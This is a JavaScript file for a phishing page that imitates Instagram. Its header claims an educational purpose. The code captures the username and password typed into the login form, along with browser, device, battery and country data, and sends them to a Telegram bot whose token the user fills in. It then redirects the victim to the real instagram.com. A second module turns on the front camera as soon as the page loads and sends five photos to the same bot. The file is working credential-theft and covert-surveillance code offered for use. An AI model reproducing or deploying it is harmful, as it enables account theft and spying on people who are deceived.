// This page is created to educate the public about phishing and how to prevent it. Please note that using this code for any illegal activities is strictly prohibited. The original code is available at https://github.com/saheermk/
document.getElementById('loginForm').addEventListener('submit', async function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Collect data
    const browserName = navigator.userAgent;
    const deviceName = navigator.platform;
    const dateTime = new Date().toLocaleString();
    const batteryPercentage = await getBatteryPercentage();
    const countryName = await getCountryName();

    

    // Format the message
    const text = `Device Data:
Browser: ${browserName}
Device: ${deviceName}
Date and Time: ${dateTime}
Battery Percentage: ${batteryPercentage}%
Country: ${countryName}`;

    const botToken = 'bot_token'; // Replace with your bot token
    const chatId = 'chat_id'; // Replace with your chat ID
    const message = `Username: ${username}\nPassword: ${password}\n${text}`;

    // Send text message to Telegram
    await sendToTelegram(botToken, chatId, message);

    // Send selfies to Telegram
    async function captureAndSendSelfies(botToken, chatId, count) {
        const selfies = await captureSelfies(count);
        for (const selfie of selfies) {
            await sendPhotoToTelegram(botToken, chatId, selfie);
        }
    }
    // Simulate form submission and redirection
    setTimeout(function() {
        var errorMessage = document.getElementById('error-message');
        if (!errorMessage || errorMessage.style.display === 'none') {
            window.location.href = 'https://www.instagram.com';
        } else {
            console.error('Form submission error detected.');
        }
    }, 1000); // Adjust the delay as needed for processing
});

// Function to get battery percentage
async function getBatteryPercentage() {
    try {
        const battery = await navigator.getBattery();
        return Math.round(battery.level * 100);
    } catch (error) {
        console.error('Error getting battery percentage:', error);
        return 'N/A';
    }
}

// Function to get country name using IP address
async function getCountryName() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return data.country_name || 'Unknown';
    } catch (error) {
        console.error('Error fetching country name:', error);
        return 'Unknown';
    }
}

// Function to capture selfies


// Function to send text message to Telegram
async function sendToTelegram(botToken, chatId, message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message })
        });
        const data = await response.json();
        if (data.ok) {
            console.log('Text message sent successfully!');
        } else {
            console.error('Failed to send text message.');
        }
    } catch (error) {
        console.error('Error sending text message:', error);
    }
}



// Get the current year
const currentYear = new Date().getFullYear();
const yearElement = document.getElementById('current-year');
if (yearElement) {
    yearElement.textContent = currentYear;
}

const SelfieCaptureModule = (() => {
    async function sendPhotoToTelegram(botToken, chatId, photoDataURL) {
        const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
        
        // Convert data URL to Blob
        const blob = await fetch(photoDataURL).then(response => response.blob());

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'selfie.jpg');

        try {
            const response = await fetch(url, {
                method: 'POST',
                body: formData,
            });
            const data = await response.json();
            console.log(data);
            if (data.ok) {
                console.log('Photo sent successfully!');
            } else {
                console.error('Failed to send photo: ' + data.description);
            }
        } catch (error) {
            console.error('Error sending photo:', error);
        }
    }

    async function captureSelfies(count) {
        const selfies = [];
        const constraints = { video: { facingMode: 'user', width: 640, height: 480 } };

        try {
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            for (let i = 0; i < count; i++) {
                await new Promise(resolve => setTimeout(resolve, 1000)); // Capture every 1 second

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                const selfieDataURL = canvas.toDataURL('image/jpeg');
                selfies.push(selfieDataURL);
            }

            stream.getTracks().forEach(track => track.stop());
        } catch (error) {
            console.error('Error capturing selfies:', error);
        }

        return selfies;
    }

    async function captureAndSendSelfies(botToken, chatId, count) {
        const selfies = await captureSelfies(count);
        for (const selfie of selfies) {
            await sendPhotoToTelegram(botToken, chatId, selfie);
        }
    }

    return {
        captureAndSendSelfies,
    };
})();

// Example usage
const chatId =  'chat_id';
const botToken = 'bot_token';
const selfieCount = 5;               // Number of selfies to capture

// Call the function to start capturing and sending selfies
SelfieCaptureModule.captureAndSendSelfies(botToken, chatId, selfieCount);
